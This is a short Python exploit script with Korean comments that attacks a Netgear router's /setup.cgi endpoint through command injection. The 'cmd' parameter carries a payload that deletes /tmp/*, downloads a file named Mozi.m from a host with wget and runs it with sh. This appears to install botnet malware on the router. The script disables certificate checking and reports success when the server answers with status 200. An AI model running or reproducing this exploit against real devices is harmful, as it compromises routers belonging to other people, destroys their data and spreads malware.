# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests
import urllib3

# SSL 경고를 비활성화
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 사용자가 입력할 기본 URL (예: http://example.com)
base_url = input("공격할 기본 URL을 입력하세요 (예: http://192.168.1.100): ")

# 고정된 /setup.cgi 추가
target_url = base_url.rstrip('/') + '/setup.cgi'

# 명령어 삽입 (공격용 페이로드)
payload = {
    'next_file': 'netgear.cfg',
    'todo': 'syscmd',
    'cmd': 'rm -rf /tmp/*; wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear; sh /tmp/netgear',
    'curpath': '/',
    'currentsetting.htm': '1'
}

# 공격 실행
try:
    # SSL 인증서 검증 비활성화
    response = requests.get(target_url, params=payload, verify=False)

    # 응답 상태 출력
    if response.status_code == 200:
        print("명령어가 성공적으로 실행되었습니다.")
    else:
        print(f"실패: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"요청 중 오류가 발생했습니다: {e}")
